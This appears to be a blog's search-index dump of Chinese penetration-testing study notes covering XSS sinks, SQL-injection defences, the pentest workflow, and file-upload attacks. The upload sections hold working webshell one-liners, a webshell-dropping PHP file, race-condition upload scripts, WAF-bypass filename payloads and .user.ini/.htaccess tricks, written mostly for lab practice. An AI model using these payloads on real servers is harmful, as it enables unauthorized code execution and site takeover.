直接修改DOM类 document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) 替换文档URL类 document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) 打开/修改窗口类 document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname)","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"}]},{"title":"文件上传进阶-waf绕过及安全修复","slug":"文件上传进阶-waf绕过及安全修复","date":"2023-05-30T07:22:30.000Z","updated":"2023-05-30T07:22:30.000Z","comments":true,"path":"articles/2023/05/30/文件上传进阶-waf绕过及安全修复/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"","text":"上传参数名解析：明确哪些参数名可以修改 content-Disposition:一般可更改（form-data）接受表单的数据 name:表单参数值，不能更改 filename:文件名，可以更改 connect-Type：文件MIME，试情况而定 常见绕过方法 数据溢出-防止匹配（xxx...）也就是垃圾数据使得WAF无法匹配 Content-Disposition: form-data; **大量垃圾数据**; name=“upload_file” ; 大量垃圾数据; filename=&quot; xxxx&quot; 拦截继续，拦截就继续加。但是可能会上传失败，上传失败就不好用了 符号变异-防匹配（' &quot; ;）匹配''以及&quot;&quot;里面的内容，没匹配到，所以绕过 safedog匹配文件名的原则，应该是在“xxxx” ‘xxxx’ 双引号或单引号之间的。双引号在后面的时候，被安全狗拦截，说明匹配的是后面的双引号，(或者单引号),之前的文件名 数据截断-防匹配（%00 ; 换行） 换行后，安全狗匹配的就是 1234x.p\\nph\\npx.\\np\\nph\\npx\\n.\\np\\nph\\np\\nx\\n.\\np\\nph\\np 重复数据-防匹配（参数多次） 主要是绕过狗子，然后进行绕过 白名单概念 过滤filename中的值，就把数据包的一些数据名称（白名单概念）插入到其中 filename=&quot; Content-Disposition: form-data; name=“upload_file” ; x.php&quot; Content-Disposition： form-data； name=“upload_file” ; x.php 安全狗认为：当检测Filename的时候，由于递归关系，继续检测，因为x.php跟在了之前的Content-Disposition： form-data； name=&quot;upload_file&quot;的后面，而不是filename的值，所以他认为是无用数据，但是在数据包中x.php确实在“xxxxx” 双引号之间，所以会被成功上传。 怎么去学习绕过waf 因为WAF都是基于数据包检测的，所以你得知道WAF是怎么匹配我们的数据包的，就拿上面的例子来说。 大量脏数据：可能就是waf匹配机制只是匹配前多少多少字节，然后后面就不匹配了 ; filename等识别：看正则匹配的条件，也就是绕过正则，一般改动不会影响数据上传的话，就直接该（参考可以改什么） 只要清楚WAF的机制，那么我们学起来就会一通百通！ 再举个例子，如果waf是检测filename=&quot;&quot;的最后一个&quot;，那么，只要我们这样构造：filename=&quot;sss&quot;s.php他就不拦截了，会保存为s.php。 但是需要注意的是，你上传的必须都要是可以执行的php文件，因为解析漏洞可不是那么好找的！ 修复 后端验证：采用服务端验证模式 后缀检测：基于黑名单，白名单过滤 MIME 检测：基于上传自带类型检测 内容检测：文件头，完整性检测 自带函数过滤：参考 uploadlabs 函数 自定义函数过滤：function check_file(){} WAF 防护产品：宝塔，云盾，安全公司产品等 资源 字典 https://github.com/fuzzdb-project/fuzzdb https://github.com/TheKingOfDuck/fuzzDicts FUZZ 12345678filename=x.phpfilename=&quot;x.phpfilename=&#x27;x.phpfilename=&quot;a.jpg;.php&quot;;filename=&quot;a.php%00.jpg&quot;filename=&quot;connect-disposition:from-data;name=&quot;upload_file&quot;;x.php&quot;filename=&quot;x.jpg&quot;;filename=&quot;x.jpg&quot;;.....filename=&quot;x.php&quot;;","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"GBT-40855-2021——电动汽车远程服务与管理系统解读","slug":"GBT-40855-2021解读","date":"2023-05-30T03:26:16.000Z","updated":"2023-05-30T03:26:16.000Z","comments":true,"path":"articles/2023/05/30/GBT-40855-2021解读/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/GBT-40855-2021%E8%A7%A3%E8%AF%BB/","excerpt":"","text":"对象 车载终端、车辆企业平台与公共平台间的数据通信。 测试要求与对象一般包括： 硬件/固件、软件系统、日志 网络端口传输、远程升级 数据存储 车载终端的安全需求 硬件： 不存在后门与隐蔽接口 调试接口应禁用或设置安全访问控制 平台间的安全需求 https://blog.csdn.net/ananas_orangey/article/details/119461914 https://www.cnblogs.com/tomyyyyy/p/17174932.html https://zhuanlan.kanxue.com/article-16906.htm https://supergate.top/2021/04/06/车联网安全测试入门总结/车联网安全测试入门总结/ https://www.ctfiot.com/23461.html https://www.eet-china.com/mp/a167077.html","categories":[{"name":"车联网标准","slug":"车联网标准","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"}],"tags":[{"name":"远程服务系统","slug":"远程服务系统","permalink":"https://j3f5.github.io/tags/%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F/"}]},{"title":"SQL注入进阶-防御措施与代码级安全","slug":"SQL注入进阶-防御措施与代码级安全","date":"2023-05-30T03:16:46.000Z","updated":"2023-05-30T03:16:46.000Z","comments":true,"path":"articles/2023/05/30/SQL注入进阶-防御措施与代码级安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%BA%A7%E5%AE%89%E5%85%A8/","excerpt":"","text":"PHP 防御 对数据类型进行检查和转义/预编译 magic_quotes_gpc = On 预处理查询 (Prepared Statements) 使用prepared statements（预处理语句）和参数化的查询，可以有效的防止sql注入。 使用mysqli:prepare()实现。也是用?占位符实现 123$stmt = $dbConnection-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = ?&#x27;);$stmt-&gt;bind_param(&#x27;s&#x27;, $name); // &#x27;s&#x27; specifies the variable type =&gt; &#x27;string&#x27;$stmt-&gt;execute(); 使用pdo实现。默认情况下，PDO会使用DSN中指定的字符集对输入参数进行本地转义 12$stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = :name&#x27;);$stmt-&gt;execute([ &#x27;name&#x27; =&gt; $name ]); 隐藏错误信息 php.ini 中的 display_errors 选项，应该设为 display_errors = off。这样 php 脚本出错之后，不会在 web 页面输出错误，以免让攻击者分析出有作的信息。 调用 mysql_query 等 mysql 函数时，前面应该加上 @，即 @mysql_query(…)，这样 mysql 错误不会被输出。同理以免让攻击者分析出有用的信息 https://segmentfault.com/a/1190000008117968 JAVA JDBC 拼接不当造成SQL 注入 JDBC 有两种方法执行SQL 语句，分别为PrepareStatement 和Statement。两个方法的区别在于PrepareStatement 会对SQL 语句进行预编译，而Statement 方法在每次执行时都需要编译，会增大系统开销。 理论上PrepareStatement 的效率和安全性会比Statement 要好，但并不意味着使用PrepareStatement 就绝对安全，不会产生SQL注入。正确地使用PrepareStatement 可以有效避免SQL 注入的产生，使用 ? 作为占位符时，填入对应字段的值会进行严格的类型检查。将前面的“拼接构造SQL 语句”改为如下“使用占位符构造SQL 语句”的代码片段，即可有效避免SQL 注入的产生。 123456String sql = &quot;select * from user where id = &quot;+req.getParameter(&quot;id&quot;);out.println(sql);...PreparedStatement pstt = con.prepareStatement(sql);ResultSet rs = pstt.executeQuery();... 1234567PrintWriter out = resp.getWriter();String sql = &quot;select * from user where id = ?&quot;; //使用了占位符out.println(sql);...PreparedStatement pstt = con.prepareStatement(sql);pstt.setInt(1, Integer.parseInt(req.getParameter(&quot;id&quot;)));ResultSet rs = pstt.executeQuery(); 框架SQL注入 如今的 Java 项目或多或少会使用对 JDBC 进行更抽象封装的持久化框架，如 MyBatis 和 Hibernate。常见的框架SSH（Struts2+Spring+Hibernate）和SSM（Spring MVC+Spring+MyBatis）分别指的就是以上两个框架 MyBatis MyBatis 框架的思想是将SQL 语句编入配置文件中，避免SQL 语句在Java 程序中大量出现，方便后续对SQL 语句的修改与配置。 MyBatis中使用parameterType向SQL 语句传参，在SQL引用传参可以使用#&#123;Parameter&#125;和$&#123;Parameter&#125;两种方式。 #与$的区别 总的来说就是#是预编译，但是$不是。 使用#&#123;Parameter&#125;构造SQL 的代码 1234&lt;select id=&quot;getUsername&quot; resultType=&quot;com.z1ng.bean.User&quot;&gt;select id,name,age from user where name = #&#123;name&#125;&lt;/select&gt;Preparing: select id,name,age from user where name = ? //生成的语句 从Debug 回显的SQL语句执行过程可以看出，使用#&#123;Parameter&#125;方式会使用“?”占位进行预编译，因此此时不存在SQL 注入。 使用$&#123;Parameter&#125;构造SQL 的代码 1234&lt;select id=&quot;getUsername&quot; resultType=&quot;com.z1ng.bean.User&quot;&gt;select id,name,age from user where name = #&#123;name&#125;&lt;/select&gt;Preparing: select id,name,age from user where name = &#x27;z1ng&#x27; //生成的语句 从上面的演示可以看出，在底层构造完整SQL 语句时，MyBatis的两种传参方式所采取的方式不同。#{Parameter}采用预编译的方式构造SQL，避免了SQL 注入的产生。而$&#123;Parameter&#125;采用拼接的方式构造SQL，在对用户输入过滤不严格的前提下，此处很可能存在SQL 注入。 Hibernate Hibernate 框架是Java 持久化API（JPA）规范的一种实现方式。Hibernate将Java类映射到数据库表中，从 Java 数据类型映射到 SQL 数据类型。 其使用HQL作为语言与数据库进行交互，HQL的语法与SQL类似，但有些许不同。受语法的影响，HQL注入在实际漏洞利用上具有一定的限制。Hibernate 是对持久化类的对象进行操作而不是直接对数据库进行操作，因此HQL 查询语句由Hibernate 引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate 引擎 1234tx = session.beginTransaction();String parameter = &quot; zaaaa&#x27; or &#x27;1&#x27;=&#x27;1 &quot;;List user = session.createQuery(&quot;FROM User where name=&#x27;&quot;+parameter+&quot;&#x27;&quot;,User.class).getResultList();tx.commit(); 通过Debug 模式可以清晰地观察到变量“parameter”被拼接进语句中，并将原本的语义改变，查询出结果 12from Userwhere name = &#x27;zaaa&#x27;... 正确使用以下几种HQL 参数绑定的方式可以有效避免注入的产生: 位置参数（Positional parameter） 1... where name = ?1; query.setParameter(1, parameter); 命名参数（named parameter） 1String parameter = &quot;z1ng&quot; ; ... where name = :name&quot;; query.setParameter(&quot;name&quot;, parameter); 命名参数列表（named parameter list） 类实例（JavaBean） 防御不当 SQL 注入最主要的成因在于未对用户输入进行严格的过滤，并采取不恰当的方式构造SQL 语句。在实际开发的过程中，有些地方难免需要使用拼接构造SQL 语句，例如SQL语句中order by 后面的参数无法使用预编译赋值。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。 审计 代码审计的核心思想是追踪参数，而追踪参数的步骤就是程序执行的步骤。因此，代码审计是一个跟踪程序执行步骤的过程，了解了框架的执行流程自然会了解如何如跟踪一个参数，剩下的就是观察在参数传递的过程中有没有一些常见的漏洞点。 全局搜索 首先看pom.xml，看用了什么数据库和什么框架。 然后搜索query()函数，看哪里用到了，就大概看一下。 功能定点 我们可以从程序的具体功能上进行定点的漏洞挖掘，与数据库交互的位置就有可能出现SQL 注入，比如用户信息页面 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement 。 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"渗透测试整体流程","slug":"渗透测试整体流程","date":"2023-05-29T14:53:16.000Z","updated":"2023-05-30T01:20:08.000Z","comments":true,"path":"articles/2023/05/29/渗透测试整体流程/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/","excerpt":"","text":"概述 明确目标 分析风险、获得授权 信息搜集 漏洞探测 漏洞验证 信息分析 利用漏洞 信息整理 形成报告 明确目标 确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块 确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权… 目标系统介绍、重点保护对象及特性。 是否允许数据破坏？ 是否允许阻断业务正常运行？ 测试之前是否应当知会相关部门接口人？ 接入方式？外网和内网？ 测试是发现问题就算成功，还是尽可能的发现多的问题？ 渗透过程是否需要考虑社会工程？ 确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？根据需求和自己技术能力来确定能不能做、能做多少 分析风险、获得授权 分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本…由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。 信息搜集 漏洞利用 利用上一步中列出的信息，使用相应的漏洞检测 方法：1）漏扫：AWVS、AppScan…2）结合漏洞去exploit-db等位置找利用3）在网上寻找验证POC 内容：系统漏洞：系统没有及时打补丁Websever漏洞：Websever配置问题Web应用漏洞：Web应用开发问题其它端口服务漏洞：各种21/8080(st2)/7001/22/3389通信安全：明文传输，token在cookie中传送等 漏洞验证 将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。 自动化验证：结合自动化扫描工具提供的结果 手工验证：根据公开资源进行验证 试验验证：自己搭建模拟环境进行验证 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息 业务漏洞验证：如发现业务漏洞，要进行验证 公开资源的利用exploit-db/wooyun/渗透代码网站通用、缺省口令厂商的漏洞警告等 信息分析 为下一步实施渗透做准备 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击 绕过防御机制：是否有防火墙等设备，如何绕过 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀） 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 利用漏洞，获取数据 实施攻击：根据前几步的结果，进行攻击 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等） 进一步渗透：内网入侵，敏感目标 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等 清理痕迹：清理相关日志（访问，操作），上传文件等 信息整理 整理渗透工具：整理渗透过程中用到的代码，poc，exp等 整理收集信息：整理渗透过程中收集到的一切信息 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 目的：为了最后形成报告，形成测试结果使用。 形成报告 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告 补充介绍：要对漏洞成因，验证过程和带来危害进行分析 修补建议：当然要对所有产生的问题提出合理高效安全的解决办","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"}]},{"title":"文件上传基础","slug":"文件上传基础","date":"2023-05-29T02:29:28.000Z","updated":"2023-05-30T01:16:44.000Z","comments":true,"path":"articles/2023/05/29/文件上传基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件上传基础 利用思路 补充 一般上传代码 代码内容：其中 uploadfile 就是上传文件的实例，然后通过$_FILE来对文件信息进行读取，然后进行判断，是对应的！！！ 1234567891011&lt;?phpecho $_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;];echo $_FILE[&#x27;uploadfile&#x27;][&#x27;type&#x27;] != &quot;image/png&quot;;// 这个move...函数需要重点注意，是上传的重要函数move_uploaded_file($_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;], &#x27;../upload/&#x27;.$_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;]);?&gt;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;uploadfile&quot;/&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;&lt;/form&gt; 文件上传漏洞如何查找及判断？ 黑盒查找。文件后台、会员中心、文件扫描。 一般可以通过url搜索上传界面 site：easyicon.net upload或inurl:upload.php 文件后台 进入网站后台不一定获得网站权限，可以从后台获取网站权限（后台拿webshell） 会员中心 通过图片上传 文件扫描 使用工具扫描出后台路径 白盒查找。通过代码分析到上传漏洞、查找文件上传功能。 对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。 注入点失败： 上传后没有返回路径（如果知道CMS类型那就好办） 上传失败 一句话木马 jsp：&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt; php：&lt;?php @eval($_POST[‘h4ck’]) ?&gt; asp：&lt;%eval request (“h4ck”)%&gt; aspx：&lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Request.Item[“h4ck”],“unsafe”);%&gt; 他们还有很多变体，但是都离不开命令执行函数。每种脚本的命令执行函数都有不少。其他的 图片马 jpg：图像以ff d8开头 gif：GIF89a 无敌，在前面加上这个就可以了！不需要什么图片啊啥的！ 然后再加上一句话木马。 也可以使用copy（需要在cmd下），即copy 1.png /b + shell.php /a webshell.jpg 整体思路 先扫目录，到什么会员中心找到上传漏洞点 筛选中间件看有没有解析漏洞 没有的话，进行注入&amp;&amp;绕过 不成功，就去看CMS版本和对应的漏洞 没有类似CMS漏洞，去找编辑器与最近的CVE漏洞 漏洞与绕过 JS前端绕过 关闭前端js即可 文件类型（黑名单绕过） 大小写/双写绕过 文件名：也就是后缀名。包括黑白名单等。 绕过：Php大小写、pphphp双写 其他特殊后缀绕过 .phtml .php5 上传函数绕过(./绕过) 上传函数：move_uploaded_file函数会忽略掉文件末尾的/. 绕过：可以构造save_path=1.php/.，这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 空格、点绕过(windows) 当接收文件时，后台代码的限制条件中没有去除文件名首尾的空格(或是没有对.进行拆分)时，可以利用windows系统的命名规则进行绕过：如，将文件后缀改为xxx.php、xxx.php.、xxx.php . 在windows下xx.jpg[空格] 或xx.jpg.这两类文件是不允许存在的，若这样命名，windows会默认去除空格或点 还有些情况具体就需要看代码逻辑，比如如果代码只删除一次点且只去除一次首尾空格，在windows环境下就可以用xxx.php. .进行绕过 ::$DATA绕过(windows) ::$DATA绕过同样利用了windows的特性 NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 即在php+windows的环境下,如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名。 .htaccess绕过（详细见后） .user.ini绕过（详细见后） 解析漏洞绕过（详细见后） 文件检测（白名单） MIME content-type绕过 文件类型：MIME类型，MIME类型就是image/png之类的content-type 涉及函数mime_content_type MIME类型：image/png、audio/mpeg # mp3 %00截断（详细见后） 00截断绕过方式需要满足以下条件 1php版本小于5.3.4``php.ini的magic_quotes_gpc为OFF状态``使用move_uploaded_file函数且参数受用户控制 此时move_uploaded_file函数遇到0x00会截断 可以将上传文件后缀改为xx.php%00进行绕过 %0a绕过 %0a绕过方式需要满足以下条件 1Apache httpd 2.4.0至2.4.29``FileMatch正则匹配.php|.php5等后缀 该版本apache会通过$匹配后缀，而$匹配时会正则匹配某字符串结尾或以换行符结尾的一个字符串，即php[换行符]会被匹配成php 可以将上传文件后缀改为xx.php%0a进行绕过 其他 文件头绕过 文件头：内容头消息 涉及函数getimagesize和exif_imagetype函数。 文件头：gif: GIF89a、png: HEX 89 50 4E 47 0D 0A 1A 0A、jpg: HEX FF D8 FF 以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。 1copy safe.jpg /b + shell.php /a shell.jpg 在该场景下，防御姿势除了基本的黑/白名单外，还包括了对一些特定字符的限制，具体情况可以进行fuzz或者有条件可以进行代码审计 条件竞争/二次渲染绕过（详细见后） 内容逻辑数组绕过与目录命名 此部分将文件名分成3部分组成一个数组,例如将&quot;xx.jpg&quot;分为:“xx”、“.”、&quot;jpg&quot;三部分 其将文件名分为3个部分，分别检测并且拼接。我们可以改数组绕过 我们抓包将.php/.jpg分三部分修改即可绕过，此时第一部分为.php/，第二部分.，第三部分jpg，后面会拼接成：.php/.，因为上面的move_uploadfile会忽略./所以，上传成功。 00截断 00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。 所以：0x00，%00，/00都是可以的！ %00截断的条件 php版本要小于5.3.4 修改php.ini的magic_quotes_gpc为OFF状态（magic_quotes_gpc他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理） 上传路径是可以控制的 则修改路径 上面的12.php后面多了%00，造成了右边的截断，空格后面的全部都不要了。 需要注意的是，可能会对%00进行编码。 如何利用 注意，这里面有一个重命名，是我们可以控制的，所以我们可以抓包，然后在POST请求中修改road参数即可！ 修改之后变成： 报错，因为要.jpg为后缀，所以在文件名后面加上.jpg即可（全部都要修改）： 逻辑安全 二次渲染 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。 形式：判断图片格式后用imagecreatefromjpeg()函数进行二次渲染 绕过方式： 抓包找到二次渲染中未被改动的地方，将一句话马插入该地方，.jpg|.png|.gif三种文件格式不同，所以构造马的方式也不同 注：gif文件最简单，直接用ue等16进制编辑器就可以改，但是jpg和png需要特殊的构造脚本 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。将保存下来经过服务器二次渲染的那张jpg图片，用010编辑器与我们的图片马进行比对，看哪一些字节是被更改过的，在没有被更改的地方替换成我们的马重新上传。 用此脚本进行处理生成payload.jpg。然后再上传payload.jpg 条件竞争（先上传再校验） 一些网站上传文件的逻辑是先允许上传任意文件，然后检测上传文件的文件包是否合法（校验文件后缀、内容等），如果不合法则删除文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。 造成漏洞的原因：先保存文件，再判断是否是允许的文件，如果不允许，则删除。 漏洞利用思路：上传一个写入木马的php文件backdoor.php，抓取数据包，对此数据包进行多线程高并发的重放。与此同时，用python不断的请求文件backdoor.php，由于多线程高并发的重放上传backdoor.php文件，所以一定会存在上传成功但还未来得及删除的backdoor.php文件使得python请求成功，一旦请求成功则会在本地写入木马。用菜刀连接即可getshell。 注意：这种条件竞争，即使你执行了一次，在那段时期内，这个不会被删（正在请求），但是一旦请求完毕，二次渲染完成，则该文件照样被删除！所以，请注意你的脚本是要 执行创建木马文件 的功能的。 123#backdoor.php#用来写入木马文件shell.php&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_PO[&quot;cmd&quot;])?&gt;&#x27;);?&gt; 1234567891011#requests_2.py#用来请求backdoor.phpimport requestsurl = &quot;http://ip/upload-labs/upload/backdoor.php&quot;url_2 = &quot;http://ip/upload-labs/upload/shell.php&quot;while True: html = requests.get(url) html_2 = requests.get(url_2) if html_2.status_code == 200: #判断shell.php是否写入成功 print(&quot;OK&quot;) break 先上传文件backdoor.php，抓取数据包发送到Inturder模块 高并发上传脚本： 1234567891011121314151617181920#upload.pyimport requestsfrom threading import Threadfile = &#123; #文件信息和文件 &quot;upload_file&quot;:open(&#x27;C:\\\\users\\\\xiamo\\\\desktop\\\\backdoor.php&#x27;), &quot;Content-Type&quot;:&quot;application/octet-stream&quot;, &quot;Content-Disposition&quot;:&quot;form-data&quot;, &quot;filename&quot;:&quot;backdoor.php&quot;&#125;url = &quot;http://192.168.1.120/upload-labs/Pass-17/index.php&quot;data = &#123; #参数 &quot;submit&quot;:&quot;上传&quot;&#125;def upload(): res = requests.post(url, files=file, data=data) print(res.status_code)while True: t = Thread(target=upload()) #创建线程 t.start() #开启线程 另外，使用inturder功能的步骤如下： 清除$$： 设置null payload： 设置多线程： 然后在浏览器中不停地访问那个上传的文件即可。 user.ini与.htaccess绕过 user.ini 利用范围 以fastcgi运行的php 首先得知道php.ini然后再去了解：.user.ini。它比.htaccess用的更广。.user.ini文件上传绕过和.htaccess文件上传绕过方式相似，都是上传一个攻击者自定义的配置文件导致服务器对图片文件的错误处理而导致的文件执行，但是.user.ini使用更加广泛，只要是以fastcgi运行的php都可以用这个方法，但是它的局限性在于上传的.user.ini文件目录必须存在可执行的php文件。 参考：https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html 简析 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 配置变量中有auto_prepend_file和auto_apend_file指定在文件前和文件尾包含文件。（这两个才是我们可以上传马的关键，指）如: 12auto_apend_file=01.gif # 指定一个文件，自动包含在要执行的文件前。auto_prepend_file=01.gif # 指定一个文件，自动包含在要执行的文件后。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 利用 新建一个文件名为.user.ini的文件，并将内容写为： 1auto_prepend_file=test.txt 将.user.ini上传至服务器 新建一个文件名为test.txt的文件，并将内容写为如下，或者写webshell马： 1&lt;?php phpinfo();?&gt; 再访问上传目录下的???.php，即可将test.txt内的内容脚本正常执行。 .htaccess 见apache解析漏洞绕过 解析漏洞 IIS解析漏洞 目录解析漏洞（/test.asp/1.jpg） 在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了。 文件名解析漏洞(test.asp;.jpg) 在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。 畸形解析漏洞(test.jpg/*.php) 微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5 在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[x])?&gt;&#x27;)?&gt; 将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行（这个的执行过程看下面），所以图片里面的代码就会被执行。我们会神奇的发现在 /upload 目录下创建了一个一句话木马文件 shell.php。 临时解决办法：设置 cgi.fix_pathinfo为0 Ngnix解析漏洞 畸形解析漏洞(test.jpg/*.php) 原因：php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo（默认为1表示开启）。/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行 例子： test.jpg存在（已上传），a.php不存在 